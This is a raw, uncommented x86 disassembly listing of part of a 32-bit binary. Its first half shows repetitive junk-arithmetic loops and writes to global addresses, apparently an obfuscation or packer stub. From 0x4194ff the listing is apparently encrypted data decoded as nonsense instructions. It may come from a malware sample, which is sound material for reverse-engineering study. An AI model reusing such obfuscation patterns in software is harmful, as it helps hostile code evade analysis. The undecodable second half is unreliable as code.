  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42aa17
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42aa1b
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	retf   
  41950c:	pushf  
  41950d:	jns    0x4194a8
  41950f:	pop    ebp
  419510:	and    BYTE PTR [edx-0x7c9fb27d],al
  419516:	cmp    DWORD PTR [ebx-0x2121d30b],0xffffffe9
  41951d:	dec    eax
  41951e:	rcl    edx,cl
  419520:	lock lock pop ebx
  419523:	jb     0x41956d
  419525:	inc    ebp
  419526:	adc    BYTE PTR [eax+ebx*2-0x3645e600],cl
  41952d:	push   edx
  41952e:	or     al,0x65
  419530:	fimul  DWORD PTR [ebp+0x1f]
  419533:	ror    DWORD PTR [esi+0x38],0x3b
  419537:	and    al,0xbf
  419539:	outs   dx,BYTE PTR ds:[esi]
  41953a:	jbe    0x4194f1
  41953c:	cmp    DWORD PTR [eax-0x36],0xfa47b733
  419543:	inc    eax
  419544:	lahf   
  419545:	dec    esi
  419546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419547:	aaa    
  419548:	rol    BYTE PTR [ebp+0x46ed6a20],1
  41954e:	cli    
  41954f:	cmp    eax,0x3467e7b5
  419554:	xchg   DWORD PTR [ebx+ebx*8+0x4f561c42],edi
  41955b:	test   BYTE PTR [esi-0x38],dl
  41955e:	cmp    BYTE PTR [edx+ebx*8+0x3a7e0bfa],0x41
  419566:	xchg   esi,eax
  419567:	imul   edi,DWORD PTR [esi+0x47e6657c],0xe3fe14ee
  419571:	imul   esp,edx,0xffffffbc
  419574:	imul   eax,DWORD PTR [edi-0x28f60d80],0xb20a78ed
  41957e:	ins    BYTE PTR es:[edi],dx
  41957f:	test   DWORD PTR [esi+0x1fcebfc3],0x30d7ec9c
  419589:	mov    ebp,0x569a6f78
  41958e:	mov    ds:0x752aca66,al
  419593:	adc    eax,0x4da194d5
  419598:	xchg   cl,dh
  41959a:	call   0xb41a:0x33d5b6b4
  4195a1:	push   eax
  4195a2:	fwait
  4195a3:	aaa    
  4195a4:	es loop 0x41953e
  4195a7:	daa    
  4195a8:	outs   dx,DWORD PTR ds:[esi]
  4195a9:	mov    edi,0x3ae045c
  4195ae:	xchg   esi,eax
  4195af:	mov    dl,0x19
  4195b1:	jae    0x4195ea
  4195b3:	xchg   BYTE PTR [edx+0x67e0567e],dh
  4195b9:	pusha  
  4195ba:	(bad)  
  4195bb:	stos   DWORD PTR es:[edi],eax
  4195bc:	test   ecx,ebx
  4195be:	lods   eax,DWORD PTR ds:[esi]
  4195bf:	jle    0x4195d9
  4195c1:	int3   
  4195c2:	sbb    al,0xe9
  4195c4:	xor    al,0x91
  4195c6:	rcl    DWORD PTR [ebx+0x373e6a7f],1
  4195cc:	repz call 0x3634:0xf4dd0699
  4195d4:	stc    
  4195d5:	or     esp,0x60b39651
  4195db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195dc:	call   0xdfd9a367
  4195e1:	adc    al,0xe5
  4195e3:	dec    ecx
  4195e4:	das    
  4195e5:	test   ecx,ebx
  4195e7:	mov    ch,0xeb
  4195e9:	add    edx,DWORD PTR [edi+0x3f]
  4195ec:	jmp    0xe6764275
  4195f1:	pop    ecx
  4195f2:	xor    ebp,DWORD PTR [eax]
  4195f4:	xchg   ecx,eax
  4195f5:	shl    ebp,0xe8
  4195f8:	shl    DWORD PTR [edx],0x9d
  4195fb:	mov    esp,0x2018d1cc
  419600:	ret    0xdf7f
  419603:	mov    bl,ah
  419605:	xchg   ebx,eax
  419606:	or     cl,BYTE PTR [ebx]
  419608:	shl    BYTE PTR [ebx-0x70],cl
  41960b:	jne    0x419685
  41960d:	jno    0x4195bf
  41960f:	sub    DWORD PTR [eax-0x66],0xc795ace8
  419616:	mov    WORD PTR [edx],fs
  419618:	repz dec ebp
  41961a:	pop    ebx
  41961b:	cs xchg edi,eax
  41961d:	fsubp  st(4),st
  41961f:	shl    BYTE PTR es:[ebp-0x77],1
  419623:	pop    eax
  419624:	push   ss
  419625:	xor    BYTE PTR [eax*8-0x5cd733a6],0x9d
  41962d:	xor    al,0x43
  41962f:	cld    
  419630:	adc    eax,eax
  419632:	inc    DWORD PTR [ebx+0x1]
  419635:	jecxz  0x4196a3
  419637:	jne    0x419684
  419639:	mov    edx,0xc4cebc04
  41963e:	aaa    
  41963f:	push   esp
  419640:	daa    
  419641:	ror    BYTE PTR [ebp+esi*2-0x66],cl
  419645:	inc    edx
  419646:	push   edx
  419647:	xor    al,0xc9
  419649:	add    ebx,DWORD PTR [ecx+0x6e]
  41964c:	outs   dx,BYTE PTR ds:[esi]
  41964d:	enter  0xdf8a,0xc6
  419651:	inc    esp
  419652:	inc    eax
  419653:	lods   al,BYTE PTR ds:[esi]
  419654:	adc    DWORD PTR [eax],ecx
  419656:	jl     0x419662
  419658:	popf   
  419659:	arpl   WORD PTR [esi+0x523d9150],cx
  41965f:	inc    esp
  419660:	sbb    BYTE PTR [edi+0x6c1823c5],bl
  419666:	imul   edx,DWORD PTR [edi],0x62
  419669:	ja     0x419648
  41966b:	pop    ebx
  41966c:	inc    esi
  41966d:	retf   0xa1a8
  419670:	mov    ds:0xa0293e0d,al
  419675:	dec    esi
  419676:	loope  0x419610
  419678:	aaa    
  419679:	shl    BYTE PTR [ecx-0x9],1
  41967c:	repnz sub al,0x70
  41967f:	mov    ah,al
  419681:	jae    0x4196e0
  419683:	imul   ecx,DWORD PTR [ebx],0x36
  419686:	add    al,0x7e
  419688:	mov    DWORD PTR [esi-0x785a7101],esp
  41968e:	mov    ebx,0x72cb968b
  419693:	(bad)  
  419694:	cmp    eax,0xdfed4fe4
  419699:	add    edx,DWORD PTR [ecx]
  41969b:	aas    
  41969c:	in     al,0xbd
  41969e:	cwde   
  41969f:	loopne 0x4196b0
  4196a1:	mov    edi,0x2b30637
  4196a6:	imul   edi,DWORD PTR [ecx],0x2d
  4196a9:	and    cl,bh
  4196ab:	mov    bl,0x79
  4196ad:	nop
  4196ae:	sbb    esi,ebx
  4196b0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4196b2:	mov    dl,0x29
  4196b4:	push   esi
  4196b5:	lods   al,BYTE PTR ds:[esi]
  4196b6:	mov    dl,0x2d
  4196b8:	sub    eax,0x7e64c494
  4196bd:	xchg   ebx,eax
  4196be:	ins    DWORD PTR es:[edi],dx
  4196bf:	imul   ebp,DWORD PTR ds:0x19761da5,0xdd633791
  4196c9:	mov    WORD PTR [ebx+0x7f2947a0],gs
  4196cf:	imul   ebx,DWORD PTR [edi-0x5a],0x3b
  4196d3:	gs dec ecx
  4196d5:	pushf  
  4196d6:	popa   
  4196d7:	(bad)  
  4196d9:	adc    dl,al
  4196db:	jae    0x419687
  4196dd:	loopne 0x4196b9
  4196df:	(bad)  
  4196e0:	or     ah,ah
  4196e2:	and    DWORD PTR ds:0xed0abe01,eax
  4196e8:	mov    edx,0x8bc3db9b
  4196ed:	stos   BYTE PTR es:[edi],al
  4196ee:	fwait
  4196ef:	mov    DWORD PTR [edi+0x257ad08],ecx
  4196f5:	clc    
  4196f6:	xor    al,0xf5
  4196f8:	jp     0x4196ad
  4196fa:	std    
  4196fb:	aas    
  4196fc:	xor    DWORD PTR [edi-0x6e],0x41a4d0fd
  419703:	dec    edx
  419704:	(bad)  
  419705:	aaa    
  419706:	pusha  
  419707:	bnd ret 
  419709:	push   ecx
  41970a:	les    edi,FWORD PTR [edx+0x1cc117b2]
  419710:	cdq    
  419711:	jae    0x4196ae
  419713:	clc    
  419714:	inc    ebp
  419715:	pop    ebx
  419716:	jge    0x4196fc
  419718:	dec    edx
  419719:	xor    DWORD PTR es:[ebx-0x56],esp
  41971d:	iret   
  41971e:	xor    BYTE PTR [eax+0x18],bl
  419721:	jp     0x419707
  419723:	mov    cl,0x64
  419725:	ins    BYTE PTR es:[edi],dx
  419726:	mov    eax,esi
  419728:	jbe    0x41972f
  41972a:	cmp    bh,0x54
  41972d:	jmp    0x4ba5364
  419732:	xchg   edi,eax
  419733:	jmp    0x11cc94f1
  419738:	int    0x82
  41973a:	xor    BYTE PTR [eax],dl
  41973c:	adc    ecx,DWORD PTR [edx]
  41973e:	sbb    eax,0xf65b0080
  419743:	pop    es
  419744:	test   al,0x3d
  419746:	pop    es
  419747:	pushf  
  419748:	and    DWORD PTR [ebx],ecx
  41974a:	mov    esp,es
  41974c:	mov    ds,WORD PTR [edx-0x7f9d02e0]
  419752:	or     al,0xad
  419754:	lea    esp,[ebx+0x41d799c3]
  41975a:	mov    eax,ds:0x692522e8
  41975f:	sbb    eax,0xec2ed20b
  419764:	sbb    DWORD PTR [ebp+0x36083a45],edx
  41976a:	add    al,0x62
  41976c:	enter  0xa55f,0x7
  419770:	sbb    dh,BYTE PTR [ecx+0x4959c9b7]
  419776:	out    0x13,eax
  419778:	lds    ebp,FWORD PTR [edi+eiz*1+0x3f4919ee]
  41977f:	add    DWORD PTR [ebp-0x6d1074c1],esp
  419785:	cmc    
  419786:	xchg   edx,eax
  419787:	mov    ebp,0xfc9fc671
  41978c:	out    0x94,al
  41978e:	cmp    eax,0xa577ef0d
  419793:	adc    BYTE PTR [ebx-0x7047008a],bh
  419799:	outs   dx,DWORD PTR ds:[esi]
  41979a:	jnp    0x419734
  41979c:	cmp    BYTE PTR [edi-0xea30d9e],dh
  4197a2:	shl    DWORD PTR [edx-0x32],1
  4197a5:	add    esi,DWORD PTR [edi+edx*1]
  4197a8:	and    eax,0x757771f6
  4197ad:	mov    ebp,0x9e765755
  4197b2:	(bad)  
  4197b3:	imul   ebx,DWORD PTR [eax+0x274fc334],0x3c50c2e4
  4197bd:	or     al,0xbe
  4197bf:	sbb    ebp,esp
  4197c1:	jae    0x41981a
  4197c3:	xchg   edx,eax
  4197c4:	ficomp WORD PTR [ebp+ecx*1-0xd]
  4197c8:	imul   esi,DWORD PTR [esi+0x74e59bc8],0x46
  4197cf:	std    
  4197d0:	repnz pusha 
  4197d2:	inc    bl
  4197d4:	std    
  4197d5:	mov    ebx,0xd8f584b
  4197da:	sub    BYTE PTR [edx-0x26],0x91
  4197de:	xor    BYTE PTR [ebx+0x7e],ch
  4197e1:	mov    ds:0x2abf6cc0,eax
  4197e6:	push   cs
  4197e7:	out    0x90,eax
  4197e9:	dec    esp
  4197ea:	or     al,0x60
  4197ec:	inc    edi
  4197ed:	push   es
  4197ee:	mov    ds:0x7eb62eda,eax
  4197f3:	xor    al,0x7f
  4197f5:	leave  
  4197f6:	aad    0xa
  4197f8:	retf   
  4197f9:	outs   dx,DWORD PTR ds:[esi]
  4197fa:	lea    ecx,[edi+0x19]
  4197fd:	popa   
  4197fe:	data16 (bad) [ecx]
  419801:	pop    eax
  419802:	xchg   edi,eax
  419803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419804:	cmp    DWORD PTR [ecx-0x22ee3e4d],ecx
  41980a:	lock mov eax,ds:0x2f6cf578
  419810:	inc    ecx
  419811:	in     al,0xb4
  419813:	in     eax,0x46
  419815:	xor    al,0xa9
  419817:	sub    edi,DWORD PTR [esi]
  419819:	nop
  41981a:	(bad)  
  41981b:	ja     0x41985e
  41981d:	fwait
  41981e:	imul   ebx,eax,0x2eacf47e
  419824:	jmp    0x8a13:0x22a1238
  41982b:	out    0x71,al
  41982d:	push   ecx
  41982e:	out    dx,eax
  41982f:	and    bl,BYTE PTR [ebx+0x7a]
  419832:	cmp    eax,0x556ae8e6
  419837:	inc    ebx
  419838:	sub    BYTE PTR [esi-0x2002b5f7],0x3e
  41983f:	int3   
  419840:	xor    ecx,ebx
  419842:	js     0x4198c0
  419844:	xchg   edx,eax
  419845:	mov    eax,0x1f39438c
  41984a:	xchg   esi,eax
  41984b:	fwait
  41984c:	(bad)  
  41984d:	cwde   
  41984e:	jecxz  0x419810
  419850:	sahf   
  419851:	mov    dh,0x6
  419853:	aam    0xfe
  419855:	cmp    BYTE PTR [esi+0x20],cl
  419858:	fnstcw WORD PTR [edx+0x6055b737]
  41985e:	push   eax
  41985f:	test   al,dl
  419861:	xchg   edx,eax
  419862:	jnp    0x419881
  419864:	mov    esp,0xfce6b5ea
  419869:	ins    DWORD PTR es:[edi],dx
  41986a:	mov    ecx,0xb3968ee8
  41986f:	cli    
  419870:	test   DWORD PTR [esi+ebp*4],edi
  419873:	sahf   
  419874:	cmp    edi,DWORD PTR [edi+0x60]
  419877:	cmp    DWORD PTR [eax-0x74242557],0xb5c7177e
  419881:	pop    esi
  419882:	pop    ss
  419883:	cmp    eax,0xf25cd622
  419888:	imul   ebx,ebp,0x21
  41988b:	cmp    al,0x39
  41988d:	add    edx,DWORD PTR [eax-0x57]
  419890:	pop    es
  419891:	bound  eax,QWORD PTR [eax]
  419893:	sbb    edi,DWORD PTR [eax-0xf]
  419896:	jae    0x41981a
  419898:	and    BYTE PTR [ebx+ebp*4+0x166f05e6],al
  41989f:	dec    ebp
  4198a0:	push   edi
  4198a1:	push   ebx
  4198a2:	in     al,0x84
  4198a4:	nop
  4198a5:	ror    eax,cl
  4198a7:	mov    ah,0x7a
  4198a9:	xchg   ebp,eax
  4198aa:	in     al,0xa6
  4198ac:	call   0x80b8365d
  4198b1:	xchg   DWORD PTR [edx],edx
  4198b3:	pop    es
  4198b4:	or     BYTE PTR [eax-0x7ec0d2b7],dh
  4198ba:	xchg   cl,bh
  4198bc:	inc    esp
  4198bd:	dec    ecx
  4198be:	shrd   DWORD PTR [eax+0x5],edx,0x92
  4198c3:	rol    BYTE PTR [eax+ebp*4],1
  4198c6:	mov    ch,0x8
  4198c8:	rcr    DWORD PTR [ecx],cl
  4198ca:	or     eax,0x3d425863
  4198cf:	xchg   esi,eax
  4198d0:	scas   al,BYTE PTR es:[edi]
  4198d1:	inc    DWORD PTR ds:0x55a6c99d
  4198d7:	rcr    BYTE PTR [esi+0x59bcac99],cl
  4198dd:	jne    0x4198f4
  4198df:	or     al,BYTE PTR [eax]
  4198e1:	sub    ch,BYTE PTR [ecx-0xd]
  4198e4:	aaa    
  4198e5:	xchg   ecx,edx
  4198e7:	leave  
  4198e8:	pop    es
  4198e9:	pop    edi
  4198ea:	adc    BYTE PTR [esi-0x19],dh
  4198ed:	inc    ecx
  4198ee:	cli    
  4198ef:	scas   eax,DWORD PTR es:[edi]
  4198f0:	mov    esi,0x31952928
  4198f5:	rcr    DWORD PTR [edx],0xbf
  4198f8:	cmp    BYTE PTR [ecx+0x78d02a4e],ah
  4198fe:	or     DWORD PTR [ecx],edx
  419900:	rol    DWORD PTR [edi-0x19619da6],1
  419906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419907:	push   0x31b32109
  41990c:	push   cs
  41990d:	inc    edx
  41990e:	sub    ebp,DWORD PTR [eax-0x105271cd]
  419914:	xor    DWORD PTR [edx+0x14],0x41a0c00
  41991b:	stos   DWORD PTR es:[edi],eax
  41991c:	clc    
  41991d:	rcr    DWORD PTR [eax-0x5045dc04],0x78
  419924:	out    0x63,al
  419926:	bound  ecx,QWORD PTR [ebx-0x537c8ade]
  41992c:	lea    eax,[eax-0x65]
  41992f:	jge    0x4198f6
  419931:	outs   dx,BYTE PTR ds:[esi]
  419932:	pop    ss
  419933:	cmp    al,0x4f
  419935:	mov    bh,al
  419937:	arpl   WORD PTR [edi-0x26b4c8e7],bp
  41993d:	ja     0x419907
  41993f:	and    eax,0x4dbbbe3a
  419944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419945:	xchg   DWORD PTR [ecx],eax
  419947:	jmp    0xe0a5e2b8
  41994c:	imul   esi,DWORD PTR [eax],0xfca8f684
  419952:	mov    ebx,0xb92eaf72
  419957:	lds    ecx,FWORD PTR [esi+eax*2]
  41995a:	sbb    al,dl
  41995c:	loope  0x419914
  41995e:	in     al,0xe7
  419960:	rcl    DWORD PTR [esi],0x56
  419963:	dec    ecx
  419964:	mov    al,0xe
  419966:	jbe    0x4199a7
  419968:	or     ecx,edx
  41996a:	int    0x26
  41996c:	cmp    DWORD PTR [ecx+edi*1],ebp
  41996f:	xchg   ebx,eax
  419970:	scas   eax,DWORD PTR es:[edi]
  419971:	mov    eax,ds:0xfdd7aac
